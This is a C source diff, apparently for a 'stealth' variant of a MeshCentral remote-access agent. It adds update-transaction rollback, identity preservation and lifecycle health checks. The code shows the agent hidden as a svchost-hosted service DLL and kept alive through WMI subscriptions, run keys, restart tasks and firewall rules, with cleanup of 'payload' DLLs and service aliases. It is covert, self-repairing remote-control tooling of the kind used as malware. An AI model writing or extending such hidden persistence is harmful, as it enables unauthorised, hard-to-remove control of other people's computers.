     if (!Stealth_RegisterSvchostService(serviceKeyName, paths.dllPath))
@@ -2147,6 +3585,7 @@ BOOL Stealth_PerformUpdate(const wchar_t* sourceExePath, const wchar_t* sourceDl
         goto CLEANUP;
     }
     Stealth_RecordServiceDllHash(serviceKeyName, paths.dllPath);
+    Stealth_RemoveInactiveSvchostPayloadDlls(&paths);
 
 CLEANUP:
     if (disabledStartType)
@@ -2187,6 +3626,142 @@ CLEANUP:
 
     if (success)
     {
+        StealthLifecycleDiscovery finalState;
+        if (!Stealth_WaitForPrimaryLifecycleOperational(30000, &finalState))
+        {
+            Stealth_LogInstallEvent(
+                L"[UPDATE] Post-update primary lifecycle did not converge before transaction cleanup (state=%ls pending=%u stageArtifacts=%u backupArtifacts=%u firewall=%u persistence=%u)",
+                Stealth_LifecycleStateToString(finalState.stateKind),
+                finalState.pendingUpdate,
+                finalState.updateStageArtifactsPresent,
+                finalState.updateBackupArtifactsPresent,
+                finalState.firewallHealthy,
+                finalState.persistenceHealthy);
+            success = FALSE;
+        }
+        else if (!Stealth_WaitForExpectedIdentity(paths.dbPath, &tx.expectedIdentity, 30000))
+        {
+            Stealth_LogInstallEvent(L"[UPDATE] Identity preservation check failed after update");
+            success = FALSE;
+        }
+        else if (!Stealth_FinalizeUpdateTransaction(&paths, &tx))
+        {
+            Stealth_LogInstallEvent(L"[UPDATE] Failed to finalize update transaction cleanup");
+            success = FALSE;
+        }
+        else if (!Stealth_WaitForPrimaryLifecycleHealthy(30000, &finalState))
+        {
+            Stealth_LogInstallEvent(
+                L"[UPDATE] Post-update discovery did not converge to healthy state after transaction cleanup (state=%ls pending=%u stageArtifacts=%u backupArtifacts=%u firewall=%u persistence=%u)",
+                Stealth_LifecycleStateToString(finalState.stateKind),
+                finalState.pendingUpdate,
+                finalState.updateStageArtifactsPresent,
+                finalState.updateBackupArtifactsPresent,
+                finalState.firewallHealthy,
+                finalState.persistenceHealthy);
+            success = FALSE;
+        }
+        else
+        {
+            StealthIdentitySnapshot finalIdentity;
+            if (finalState.stateKind != STEALTH_LIFECYCLE_STATE_HEALTHY)
+            {
+                Stealth_LogInstallEvent(L"[UPDATE] Primary agent converged but companion state remains degraded (%ls)",
+                    Stealth_LifecycleStateToString(finalState.stateKind));
+            }
+            if (Stealth_CaptureIdentitySnapshot(paths.dbPath, &finalIdentity))
+            {
+                Stealth_LogIdentitySnapshot(L"after-update", &finalIdentity);
+            }
+        }
+    }
+
+    if (!success)
+    {
+        BOOL canRollback = tx.backupsReady;
+        if (canRollback)
+        {
+            BOOL rollbackOk = FALSE;
+            Stealth_LogInstallEvent(L"[UPDATE] Attempting rollback for %ls", serviceKeyName);
+            (void)Stealth_StopServiceAndWait(serviceKeyName, 20000, TRUE);
+            if (hostExePath[0] != L'\0')
+            {
+                Stealth_TerminateProcessesByPath(hostExePath);
+            }
+            Stealth_TerminateProcessesByPath(paths.exePath);
+            rollbackOk = Stealth_RollbackUpdateTransaction(&paths, serviceKeyName, &tx);
+            if (rollbackOk && restartService)
+            {
+                rollbackOk = Stealth_StartSvchostServiceAndWait(serviceKeyName, paths.dllPath, 30000, TRUE);
+            }
+            if (rollbackOk)
+            {
+                StealthLifecycleDiscovery rollbackState;
+                rollbackOk = Stealth_WaitForPrimaryLifecycleOperational(30000, &rollbackState);
+                if (!rollbackOk)
+                {
+                    Stealth_LogInstallEvent(
+                        L"[UPDATE] Rollback primary lifecycle did not converge before transaction cleanup (state=%ls pending=%u stageArtifacts=%u backupArtifacts=%u firewall=%u persistence=%u)",
+                        Stealth_LifecycleStateToString(rollbackState.stateKind),
+                        rollbackState.pendingUpdate,
+                        rollbackState.updateStageArtifactsPresent,
+                        rollbackState.updateBackupArtifactsPresent,
+                        rollbackState.firewallHealthy,
+                        rollbackState.persistenceHealthy);
+                }
+                if (rollbackOk)
+                {
+                    rollbackOk = Stealth_WaitForExpectedIdentity(paths.dbPath, &tx.expectedIdentity, 30000);
+                    if (!rollbackOk)
+                    {
+                        Stealth_LogInstallEvent(L"[UPDATE] Identity preservation check failed after rollback");
+                    }
+                }
+                if (rollbackOk)
+                {
+                    rollbackOk = Stealth_FinalizeUpdateTransaction(&paths, &tx);
+                    if (!rollbackOk)
+                    {
+                        Stealth_LogInstallEvent(L"[UPDATE] Failed to finalize rollback transaction cleanup");
+                    }
+                }
+                if (rollbackOk)
+                {
+                    rollbackOk = Stealth_WaitForPrimaryLifecycleHealthy(30000, &rollbackState);
+                    if (!rollbackOk)
+                    {
+                        Stealth_LogInstallEvent(
+                            L"[UPDATE] Rollback discovery did not converge to healthy state after transaction cleanup (state=%ls pending=%u stageArtifacts=%u backupArtifacts=%u firewall=%u persistence=%u)",
+                            Stealth_LifecycleStateToString(rollbackState.stateKind),
+                            rollbackState.pendingUpdate,
+                            rollbackState.updateStageArtifactsPresent,
+                            rollbackState.updateBackupArtifactsPresent,
+                            rollbackState.firewallHealthy,
+                            rollbackState.persistenceHealthy);
+                    }
+                }
+                if (rollbackOk)
+                {
+                    StealthIdentitySnapshot rollbackIdentity;
+                    if (rollbackState.stateKind != STEALTH_LIFECYCLE_STATE_HEALTHY)
+                    {
+                        Stealth_LogInstallEvent(L"[UPDATE] Rollback restored primary agent health but companion state remains degraded (%ls)",
+                            Stealth_LifecycleStateToString(rollbackState.stateKind));
+                    }
+                    if (Stealth_CaptureIdentitySnapshot(paths.dbPath, &rollbackIdentity))
+                    {
+                        Stealth_LogIdentitySnapshot(L"after-rollback", &rollbackIdentity);
+                    }
+                }
+            }
+            Stealth_LogInstallEvent(L"[UPDATE] Rollback %ls for %ls", rollbackOk ? L"completed" : L"failed", serviceKeyName);
+        }
+    }
+
+    Stealth_DeleteUpdateTransactionArtifacts(&tx);
+
+    if (success)
+    {
         Stealth_LogInstallEvent(L"[UPDATE] Update completed for %ls", serviceKeyName);
     }
     else
@@ -2207,8 +3782,13 @@ BOOL Stealth_IsAlreadyInstalled(void)
     BOOL installed = FALSE;
     wchar_t serviceKeyName[256] = {0};
 
-    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
-    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
+    Stealth_ResolveRuntimeServiceBranding(
+        serviceKeyName,
+        _countof(serviceKeyName),
+        NULL,
+        0,
+        NULL,
+        0);
 
     hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
     if (hSCM)
@@ -2250,6 +3830,7 @@ typedef struct StealthValidationSummary
     BOOL serviceUnload;
     BOOL serviceDllHash;
     BOOL serviceDacl;
+    BOOL serviceAliasClean;
     BOOL serviceRunning;
     BOOL firewallRule;
     BOOL persistenceState;
@@ -2257,6 +3838,7 @@ typedef struct StealthValidationSummary
     BOOL restartTask;
     BOOL wmiSubscription;
     BOOL runKey;
+    BOOL pendingUpdateClear;
 } StealthValidationSummary;
 
 static BOOL Stealth_PathExists(const wchar_t* path)
@@ -2463,6 +4045,823 @@ static BOOL Stealth_ValidateHostExecutableDacl(const wchar_t* exePath)
     return Stealth_ValidatePathDaclWithExpected(exePath, STEALTH_HOST_EXE_DACL_SDDL);
 }
 
+static const wchar_t* Stealth_LifecycleStateToString(StealthLifecycleStateKind stateKind)
+{
+    switch (stateKind)
+    {
+        case STEALTH_LIFECYCLE_STATE_CLEAN: return L"clean";
+        case STEALTH_LIFECYCLE_STATE_HEALTHY: return L"healthy";
+        case STEALTH_LIFECYCLE_STATE_PARTIAL: return L"partial";
+        case STEALTH_LIFECYCLE_STATE_BROKEN: return L"broken";
+        case STEALTH_LIFECYCLE_STATE_PENDING_UPDATE: return L"pending-update";
+        case STEALTH_LIFECYCLE_STATE_UNINSTALL_RESIDUE: return L"uninstall-residue";
+        default: return L"unknown";
+    }
+}
+
+static void MeshInstaller_UppercaseInplace(wchar_t* value)
+{
+    if (value == NULL || value[0] == L'\0') { return; }
+    CharUpperBuffW(value, (DWORD)wcslen(value));
+}
+
+static const wchar_t* Stealth_LifecycleRequestToString(StealthLifecycleRequest request)
+{
+    switch (request)
+    {
+        case STEALTH_LIFECYCLE_REQUEST_INSTALL: return L"install";
+        case STEALTH_LIFECYCLE_REQUEST_UPDATE: return L"update";
+        case STEALTH_LIFECYCLE_REQUEST_REPAIR: return L"repair";
+        case STEALTH_LIFECYCLE_REQUEST_REINSTALL: return L"reinstall";
+        case STEALTH_LIFECYCLE_REQUEST_UNINSTALL: return L"uninstall";
+        default: return L"unknown";
+    }
+}
+
+static const wchar_t* Stealth_LifecycleActionToString(StealthLifecycleAction action)
+{
+    switch (action)
+    {
+        case STEALTH_LIFECYCLE_ACTION_INSTALL: return L"install";
+        case STEALTH_LIFECYCLE_ACTION_UPDATE: return L"update";
+        case STEALTH_LIFECYCLE_ACTION_REPAIR: return L"repair";
+        case STEALTH_LIFECYCLE_ACTION_UNINSTALL: return L"uninstall";
+        default: return L"noop";
+    }
+}
+
+static BOOL Stealth_DataStoreValueExists(const wchar_t* dbPath, const char* key, char* buffer, size_t bufferLen, int* valueLenOut)
+{
+    if (valueLenOut != NULL) { *valueLenOut = 0; }
+    if (buffer != NULL && bufferLen > 0) { buffer[0] = 0; }
+    if (dbPath == NULL || dbPath[0] == L'\0' || key == NULL || key[0] == '\0') { return FALSE; }
+    if (!Stealth_PathExists(dbPath)) { return FALSE; }
+
+    char dbPathUtf8[ILibSimpleDataStore_MaxFilePath] = {0};
+    if (WideCharToMultiByte(CP_UTF8, 0, dbPath, -1, dbPathUtf8, (int)sizeof(dbPathUtf8), NULL, NULL) <= 0)
+    {
+        return FALSE;
+    }
+    if (ILibSimpleDataStore_Exists(dbPathUtf8) == 0) { return FALSE; }
+
+    ILibSimpleDataStore store = ILibSimpleDataStore_CreateEx2(dbPathUtf8, 0, 1);
+    if (store == NULL) { return FALSE; }
+
+    int valueLen = ILibSimpleDataStore_Get(store, (char*)key, buffer, bufferLen);
+    ILibSimpleDataStore_Close(store);
+
+    if (valueLenOut != NULL) { *valueLenOut = valueLen; }
+    if (buffer != NULL && bufferLen > 0)
+    {
+        size_t terminator = (valueLen >= 0 && (size_t)valueLen < bufferLen) ? (size_t)valueLen : (bufferLen - 1);
+        buffer[terminator] = 0;
+    }
+
+    return (valueLen > 0);
+}
+
+static BOOL Stealth_DataStorePutValue(const wchar_t* dbPath, const char* key, const char* value, size_t valueLen)
+{
+    if (dbPath == NULL || dbPath[0] == L'\0' || key == NULL || key[0] == '\0' || value == NULL || valueLen == 0) { return FALSE; }
+
+    char dbPathUtf8[ILibSimpleDataStore_MaxFilePath] = {0};
+    if (WideCharToMultiByte(CP_UTF8, 0, dbPath, -1, dbPathUtf8, (int)sizeof(dbPathUtf8), NULL, NULL) <= 0)
+    {
+        return FALSE;
+    }
+
+    ILibSimpleDataStore store = ILibSimpleDataStore_CreateEx2(dbPathUtf8, 0, 0);
+    if (store == NULL) { return FALSE; }
+
+    const int putStatus = ILibSimpleDataStore_PutEx(store, (char*)key, (size_t)strnlen_s(key, 255), (char*)value, valueLen);
+    ILibSimpleDataStore_Close(store);
+    return (putStatus == 0);
+}
+
+static BOOL Stealth_DataStoreDeleteValue(const wchar_t* dbPath, const char* key)
+{
+    if (dbPath == NULL || dbPath[0] == L'\0' || key == NULL || key[0] == '\0') { return FALSE; }
+    if (!Stealth_PathExists(dbPath)) { return FALSE; }
+
+    char dbPathUtf8[ILibSimpleDataStore_MaxFilePath] = {0};
+    if (WideCharToMultiByte(CP_UTF8, 0, dbPath, -1, dbPathUtf8, (int)sizeof(dbPathUtf8), NULL, NULL) <= 0)
+    {
+        return FALSE;
+    }
+    if (ILibSimpleDataStore_Exists(dbPathUtf8) == 0) { return FALSE; }
+
+    ILibSimpleDataStore store = ILibSimpleDataStore_CreateEx2(dbPathUtf8, 0, 0);
+    if (store == NULL) { return FALSE; }
+
+    const int deleteStatus = ILibSimpleDataStore_DeleteEx(store, (char*)key, (size_t)strnlen_s(key, 255));
+    ILibSimpleDataStore_Close(store);
+    return (deleteStatus == 0);
+}
+
+static BOOL Stealth_IsPrintableIdentityValue(const char* value, int valueLen)
+{
+    if (value == NULL || valueLen <= 0) { return FALSE; }
+
+    int printableLen = valueLen;
+    if (printableLen > 0 && value[printableLen - 1] == '\0')
+    {
+        --printableLen;
+    }
+
+    if (printableLen <= 0) { return FALSE; }
+    for (int i = 0; i < printableLen; ++i)
+    {
+        const unsigned char ch = (unsigned char)value[i];
+        if (ch < 32 || ch > 126)
+        {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+static void Stealth_LogIdentityField(const wchar_t* phase, const char* keyName, const char* value, int valueLen, BOOL present)
+{
+    if (keyName == NULL || keyName[0] == '\0') { return; }
+
+    if (!present)
+    {
+        Stealth_LogInstallEvent(L"[IDENTITY] %ls %S=absent", (phase != NULL ? phase : L"snapshot"), keyName);
+        return;
+    }
+
+    if (Stealth_IsPrintableIdentityValue(value, valueLen))
+    {
+        Stealth_LogInstallEvent(L"[IDENTITY] %ls %S len=%d value=%hs",
+            (phase != NULL ? phase : L"snapshot"),
+            keyName,
+            valueLen,
+            value);
+        return;
+    }
+
+    int renderLen = valueLen;
+    if (renderLen > 64) { renderLen = 64; }
+    char hex[(64 * 2) + 1] = {0};
+    util_tohex((char*)value, (size_t)renderLen, hex);
+    Stealth_LogInstallEvent(L"[IDENTITY] %ls %S len=%d hex=%hs%ls",
+        (phase != NULL ? phase : L"snapshot"),
+        keyName,
+        valueLen,
+        hex,
+        valueLen > renderLen ? L"..." : L"");
+}
+
+static BOOL Stealth_CaptureIdentitySnapshot(const wchar_t* dbPath, StealthIdentitySnapshot* snapshot)
+{
+    if (snapshot == NULL) { return FALSE; }
+    ZeroMemory(snapshot, sizeof(*snapshot));
+    if (dbPath == NULL || dbPath[0] == L'\0') { return FALSE; }
+
+    snapshot->nodeIdPresent = Stealth_DataStoreValueExists(dbPath, "NodeID", snapshot->nodeId, sizeof(snapshot->nodeId), &snapshot->nodeIdLen);
+    snapshot->meshIdPresent = Stealth_DataStoreValueExists(dbPath, "MeshID", snapshot->meshId, sizeof(snapshot->meshId), &snapshot->meshIdLen);
+    snapshot->serverIdPresent = Stealth_DataStoreValueExists(dbPath, "ServerID", snapshot->serverId, sizeof(snapshot->serverId), &snapshot->serverIdLen);
+    snapshot->meshServerPresent = Stealth_DataStoreValueExists(dbPath, "MeshServer", snapshot->meshServer, sizeof(snapshot->meshServer), &snapshot->meshServerLen);
+
+    return (snapshot->nodeIdPresent ||
+            snapshot->meshIdPresent ||
+            snapshot->serverIdPresent ||
+            snapshot->meshServerPresent);
+}
+
+static void Stealth_LogIdentitySnapshot(const wchar_t* phase, const StealthIdentitySnapshot* snapshot)
+{
+    if (snapshot == NULL) { return; }
+    Stealth_LogIdentityField(phase, "NodeID", snapshot->nodeId, snapshot->nodeIdLen, snapshot->nodeIdPresent);
+    Stealth_LogIdentityField(phase, "MeshID", snapshot->meshId, snapshot->meshIdLen, snapshot->meshIdPresent);
+    Stealth_LogIdentityField(phase, "ServerID", snapshot->serverId, snapshot->serverIdLen, snapshot->serverIdPresent);
+    Stealth_LogIdentityField(phase, "MeshServer", snapshot->meshServer, snapshot->meshServerLen, snapshot->meshServerPresent);
+}
+
+static BOOL Stealth_IdentityFieldMatches(const char* keyName, BOOL expectedPresent, const char* expectedValue, int expectedValueLen, BOOL actualPresent, const char* actualValue, int actualValueLen)
+{
+    if (!expectedPresent) { return TRUE; }
+    if (!actualPresent)
+    {
+        Stealth_LogInstallEvent(L"[IDENTITY] Missing expected %S in current datastore snapshot", keyName);
+        return FALSE;
+    }
+    if (expectedValueLen != actualValueLen || memcmp(expectedValue, actualValue, (size_t)expectedValueLen) != 0)
+    {
+        Stealth_LogInstallEvent(L"[IDENTITY] Value mismatch for %S (expectedLen=%d, actualLen=%d)", keyName, expectedValueLen, actualValueLen);
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static BOOL Stealth_IdentitySnapshotMatches(const StealthIdentitySnapshot* expected, const StealthIdentitySnapshot* actual)
+{
+    if (expected == NULL || actual == NULL) { return FALSE; }
+
+    return (Stealth_IdentityFieldMatches("NodeID", expected->nodeIdPresent, expected->nodeId, expected->nodeIdLen, actual->nodeIdPresent, actual->nodeId, actual->nodeIdLen) &&
+            Stealth_IdentityFieldMatches("MeshID", expected->meshIdPresent, expected->meshId, expected->meshIdLen, actual->meshIdPresent, actual->meshId, actual->meshIdLen) &&
+            Stealth_IdentityFieldMatches("ServerID", expected->serverIdPresent, expected->serverId, expected->serverIdLen, actual->serverIdPresent, actual->serverId, actual->serverIdLen) &&
+            Stealth_IdentityFieldMatches("MeshServer", expected->meshServerPresent, expected->meshServer, expected->meshServerLen, actual->meshServerPresent, actual->meshServer, actual->meshServerLen));
+}
+
+static BOOL Stealth_IsMasterServicePipeReady(void)
+{
+    char response[4096] = {0};
+    if (!Stealth_SendMasterServiceControlRequest("{\"op\":\"status\"}\n", response, sizeof(response)))
+    {
+        return FALSE;
+    }
+    if (strstr(response, "\"ok\":true") != NULL)
+    {
+        return TRUE;
+    }
+    if (strstr(response, "unknown op") != NULL)
+    {
+        ZeroMemory(response, sizeof(response));
+        if (!Stealth_SendMasterServiceControlRequest("{\"op\":\"listProcesses\"}\n", response, sizeof(response)))
+        {
+            return FALSE;
+        }
+        return (strstr(response, "\"ok\":true") != NULL);
+    }
+
+    return FALSE;
+}
+
+static BOOL Stealth_SendMasterServiceControlRequest(const char* requestJson, char* response, size_t responseLen)
+{
+    if (requestJson == NULL || requestJson[0] == '\0' || response == NULL || responseLen < 2) { return FALSE; }
+    response[0] = '\0';
+
+    if (!WaitNamedPipeW(STEALTH_MASTER_SERVICE_PIPE_NAME, 1500))
+    {
+        return FALSE;
+    }
+
+    HANDLE pipe = CreateFileW(
+        STEALTH_MASTER_SERVICE_PIPE_NAME,
+        GENERIC_READ | GENERIC_WRITE,
+        0,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL);
+    if (pipe == INVALID_HANDLE_VALUE)
+    {
+        return FALSE;
+    }
+
+    DWORD written = 0;
+    BOOL ok = WriteFile(pipe, requestJson, (DWORD)strlen(requestJson), &written, NULL);
+    DWORD read = 0;
+    if (ok)
+    {
+        ok = ReadFile(pipe, response, (DWORD)(responseLen - 1), &read, NULL);
+    }
+    CloseHandle(pipe);
+
+    if (!ok) { return FALSE; }
+    if (read >= responseLen) { read = (DWORD)(responseLen - 1); }
+    response[read] = '\0';
+    return TRUE;
+}
+
+static BOOL Stealth_QueryServiceImagePathW(const wchar_t* serviceName, wchar_t* imagePath, size_t imagePathCch)
+{
+    if (imagePath == NULL || imagePathCch == 0) { return FALSE; }
+    imagePath[0] = L'\0';
+    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
+
+    BOOL ok = FALSE;
+    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
+    if (scm == NULL) { return FALSE; }
+
+    SC_HANDLE svc = OpenServiceW(scm, serviceName, SERVICE_QUERY_CONFIG);
+    if (svc != NULL)
+    {
+        DWORD bytesNeeded = 0;
+        QueryServiceConfigW(svc, NULL, 0, &bytesNeeded);
+        if (bytesNeeded > 0 && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
+        {
+            QUERY_SERVICE_CONFIGW* config = (QUERY_SERVICE_CONFIGW*)LocalAlloc(LPTR, bytesNeeded);
+            if (config != NULL)
+            {
+                if (QueryServiceConfigW(svc, config, bytesNeeded, &bytesNeeded) &&
+                    config->lpBinaryPathName != NULL &&
+                    SUCCEEDED(StringCchCopyW(imagePath, imagePathCch, config->lpBinaryPathName)))
+                {
+                    ok = TRUE;
+                }
+                LocalFree(config);
+            }
+        }
+        CloseServiceHandle(svc);
+    }
+
+    CloseServiceHandle(scm);
+    return ok;
+}
+
+static void Stealth_LogLifecycleSnapshot(const wchar_t* phase, const StealthLifecycleDiscovery* discovery, const StealthLifecyclePlan* plan)
+{
+    if (discovery == NULL) { return; }
+
+    Stealth_LogInstallEvent(
+        L"[LIFECYCLE] phase=%ls request=%ls action=%ls state=%ls service=%u running=%u exe=%u dll=%u conf=%u db=%u firewall=%u persistence=%u umh=%u pendingUpdate=%u stageArtifacts=%u backupArtifacts=%u nodeId=%u aliasCount=%lu",
+        (phase != NULL ? phase : L"snapshot"),
+        (plan != NULL ? Stealth_LifecycleRequestToString(plan->request) : L"(none)"),
+        (plan != NULL ? Stealth_LifecycleActionToString(plan->action) : L"(none)"),
+        Stealth_LifecycleStateToString(discovery->stateKind),
+        discovery->serviceExists,
+        discovery->serviceRunning,
+        discovery->exeExists,
+        discovery->dllExists,
+        discovery->confExists,
+        discovery->dbExists,
+        discovery->firewallHealthy,
+        discovery->persistenceHealthy,
+        discovery->masterServiceHealthy,
+        discovery->pendingUpdate,
+        discovery->updateStageArtifactsPresent,
+        discovery->updateBackupArtifactsPresent,
+        discovery->nodeIdPresent,
+        discovery->conflictingServiceAliasCount);
+}
+
+static BOOL Stealth_IsPrimaryLifecycleConverged(const StealthLifecycleDiscovery* discovery, BOOL requirePendingClear)
+{
+    if (discovery == NULL) { return FALSE; }
+
+    const BOOL filesystemHealthy = (discovery->installRootExists &&
+                                    discovery->logsDirExists &&
+                                    discovery->exeExists &&
+                                    discovery->dllExists &&
+                                    discovery->confExists &&
+                                    discovery->installRootDaclValid &&
+                                    discovery->logsDirDaclValid &&
+                                    discovery->exeDaclValid &&
+                                    discovery->configKeysValid);
+    const BOOL serviceHealthy = (discovery->serviceExists &&
+                                 discovery->serviceKeyExists &&
+                                 discovery->serviceTypeValid &&
+                                 discovery->serviceStartValid &&
+                                 discovery->serviceImageValid &&
+                                 discovery->serviceGroupValid &&
+                                 discovery->serviceAccountValid &&
+                                 discovery->serviceDllValid &&
+                                 discovery->serviceMainValid &&
+                                 discovery->serviceUnloadValid &&
+                                 discovery->serviceDaclValid &&
+                                 discovery->serviceAliasClean);
+
+    return ((!requirePendingClear || !discovery->pendingUpdate) &&
+            filesystemHealthy &&
+            serviceHealthy &&
+            discovery->firewallHealthy &&
+            discovery->persistenceHealthy);
+}
+
+static BOOL Stealth_IsPrimaryLifecycleHealthy(const StealthLifecycleDiscovery* discovery)
+{
+    return Stealth_IsPrimaryLifecycleConverged(discovery, TRUE);
+}
+
+static BOOL Stealth_IsPrimaryLifecycleOperational(const StealthLifecycleDiscovery* discovery)
+{
+    return Stealth_IsPrimaryLifecycleConverged(discovery, FALSE);
+}
+
+static BOOL Stealth_WaitForPrimaryLifecycleConverged(DWORD timeoutMs, BOOL requirePendingClear, StealthLifecycleDiscovery* discoveryOut)
+{
+    const DWORD startTick = GetTickCount();
+    StealthLifecycleDiscovery currentState;
+
+    if (discoveryOut != NULL)
+    {
+        ZeroMemory(discoveryOut, sizeof(*discoveryOut));
+    }
+
+    do
+    {
+        if (Stealth_DiscoverCurrentState(&currentState))
+        {
+            if (Stealth_IsPrimaryLifecycleConverged(&currentState, requirePendingClear))
+            {
+                if (discoveryOut != NULL)
+                {
+                    *discoveryOut = currentState;
+                }
+                return TRUE;
+            }
+            if (discoveryOut != NULL)
+            {
+                *discoveryOut = currentState;
+            }
+        }
+        Sleep(500);
+    } while ((GetTickCount() - startTick) < timeoutMs);
+
+    return FALSE;
+}
+
+static BOOL Stealth_WaitForPrimaryLifecycleHealthy(DWORD timeoutMs, StealthLifecycleDiscovery* discoveryOut)
+{
+    return Stealth_WaitForPrimaryLifecycleConverged(timeoutMs, TRUE, discoveryOut);
+}
+
+static BOOL Stealth_WaitForPrimaryLifecycleOperational(DWORD timeoutMs, StealthLifecycleDiscovery* discoveryOut)
+{
+    return Stealth_WaitForPrimaryLifecycleConverged(timeoutMs, FALSE, discoveryOut);
+}
+
+static BOOL Stealth_BuildTransitionPlan(const StealthLifecycleDiscovery* discovery, StealthLifecycleRequest request, StealthLifecyclePlan* plan)
+{
+    if (discovery == NULL || plan == NULL) { return FALSE; }
+    ZeroMemory(plan, sizeof(*plan));
+    plan->request = request;
+
+    switch (request)
+    {
+        case STEALTH_LIFECYCLE_REQUEST_INSTALL:
+            plan->action = (discovery->stateKind == STEALTH_LIFECYCLE_STATE_CLEAN) ?
+                STEALTH_LIFECYCLE_ACTION_INSTALL : STEALTH_LIFECYCLE_ACTION_REPAIR;
+            break;
+        case STEALTH_LIFECYCLE_REQUEST_UPDATE:
+            if (discovery->stateKind == STEALTH_LIFECYCLE_STATE_CLEAN)
+            {
+                plan->action = STEALTH_LIFECYCLE_ACTION_INSTALL;
+            }
+            else if (discovery->stateKind == STEALTH_LIFECYCLE_STATE_HEALTHY)
+            {
+                plan->action = STEALTH_LIFECYCLE_ACTION_UPDATE;
+            }
+            else
+            {
+                plan->action = STEALTH_LIFECYCLE_ACTION_REPAIR;
+            }
+            break;
+        case STEALTH_LIFECYCLE_REQUEST_REPAIR:
+        case STEALTH_LIFECYCLE_REQUEST_REINSTALL:
+            plan->action = (discovery->stateKind == STEALTH_LIFECYCLE_STATE_CLEAN) ?
+                STEALTH_LIFECYCLE_ACTION_INSTALL : STEALTH_LIFECYCLE_ACTION_REPAIR;
+            break;
+        case STEALTH_LIFECYCLE_REQUEST_UNINSTALL:
+            plan->action = (discovery->stateKind == STEALTH_LIFECYCLE_STATE_CLEAN) ?
+                STEALTH_LIFECYCLE_ACTION_NONE : STEALTH_LIFECYCLE_ACTION_UNINSTALL;
+            break;
+        default:
+            return FALSE;
+    }
+
+    plan->preserveIdentity = (request != STEALTH_LIFECYCLE_REQUEST_UNINSTALL && discovery->dbExists && discovery->nodeIdPresent);
+    plan->requiresQuiesce = (plan->action == STEALTH_LIFECYCLE_ACTION_UPDATE ||
+                             plan->action == STEALTH_LIFECYCLE_ACTION_REPAIR ||
+                             plan->action == STEALTH_LIFECYCLE_ACTION_UNINSTALL);
+    plan->requiresStage = (plan->action == STEALTH_LIFECYCLE_ACTION_INSTALL ||
+                           plan->action == STEALTH_LIFECYCLE_ACTION_UPDATE ||
+                           plan->action == STEALTH_LIFECYCLE_ACTION_REPAIR);
+    plan->requiresRemoval = (plan->action == STEALTH_LIFECYCLE_ACTION_UNINSTALL);
+    plan->requiresServiceStart = (plan->action == STEALTH_LIFECYCLE_ACTION_INSTALL ||
+                                  plan->action == STEALTH_LIFECYCLE_ACTION_UPDATE ||
+                                  plan->action == STEALTH_LIFECYCLE_ACTION_REPAIR);
+    return TRUE;
+}
+
+static BOOL Stealth_DiscoverCurrentState(StealthLifecycleDiscovery* discovery)
+{
+    if (discovery == NULL) { return FALSE; }
+    ZeroMemory(discovery, sizeof(*discovery));
+
+    if (!Stealth_GetInstallPaths(&discovery->paths))
+    {
+        return FALSE;
+    }
+
+    Stealth_ResolveRuntimeServiceBranding(
+        discovery->serviceKeyName,
+        _countof(discovery->serviceKeyName),
+        discovery->serviceDisplayName,
+        _countof(discovery->serviceDisplayName),
+        NULL,
+        0);
+
+    StringCchPrintfW(discovery->serviceKeyPath, _countof(discovery->serviceKeyPath),
+        L"SYSTEM\\CurrentControlSet\\Services\\%s", discovery->serviceKeyName);
+    StringCchPrintfW(discovery->serviceParamsPath, _countof(discovery->serviceParamsPath),
+        L"%s\\Parameters", discovery->serviceKeyPath);
+    MeshInstaller_CombinePath(discovery->stateDirPath, _countof(discovery->stateDirPath), discovery->paths.installDir, L"state");
+    MeshInstaller_CombinePath(discovery->masterServicePath, _countof(discovery->masterServicePath), discovery->paths.installDir, STEALTH_MASTER_SERVICE_EXE_NAME);
+
+    discovery->installRootExists = Stealth_PathExists(discovery->paths.installDir);
+    discovery->logsDirExists = Stealth_PathExists(discovery->paths.logsDir);
+    discovery->exeExists = Stealth_PathExists(discovery->paths.exePath);
+    discovery->dllExists = Stealth_PathExists(discovery->paths.dllPath);
+    discovery->confExists = Stealth_PathExists(discovery->paths.confPath);
+    discovery->dbExists = Stealth_PathExists(discovery->paths.dbPath);
+    discovery->installRootDaclValid = (discovery->installRootExists ? Stealth_ValidateInstallRootDacl(discovery->paths.installDir) : FALSE);
+    discovery->logsDirDaclValid = (discovery->logsDirExists ? Stealth_ValidatePathDacl(discovery->paths.logsDir) : FALSE);
+    discovery->exeDaclValid = (discovery->exeExists ? Stealth_ValidateHostExecutableDacl(discovery->paths.exePath) : FALSE);
+    discovery->configKeysValid = (discovery->confExists ? Stealth_ConfigHasRequiredKeys(discovery->paths.confPath) : FALSE);
+
+    HKEY serviceKey = NULL;
+    discovery->serviceKeyExists = (RegOpenKeyExW(HKEY_LOCAL_MACHINE, discovery->serviceKeyPath, 0, KEY_QUERY_VALUE, &serviceKey) == ERROR_SUCCESS);
+    if (serviceKey != NULL) { RegCloseKey(serviceKey); }
+
+    discovery->serviceExists = Stealth_IsAlreadyInstalled();
+    discovery->serviceRunning = (discovery->serviceExists ? Stealth_ServiceIsRunning(discovery->serviceKeyName) : FALSE);
+    if (discovery->serviceKeyExists)
+    {
+        DWORD typeValue = 0;
+        DWORD startValue = 0;
+        DWORD unloadValue = 0;
+        wchar_t imagePath[512] = {0};
+        wchar_t objectName[256] = {0};
+        wchar_t serviceDll[512] = {0};
+        wchar_t serviceMain[128] = {0};
+
+        discovery->serviceTypeValid = (Stealth_ReadRegistryDword(HKEY_LOCAL_MACHINE, discovery->serviceKeyPath, L"Type", &typeValue) &&
+                                       typeValue == SERVICE_WIN32_SHARE_PROCESS);
+        discovery->serviceStartValid = (Stealth_ReadRegistryDword(HKEY_LOCAL_MACHINE, discovery->serviceKeyPath, L"Start", &startValue) &&
+                                        startValue == SERVICE_AUTO_START);
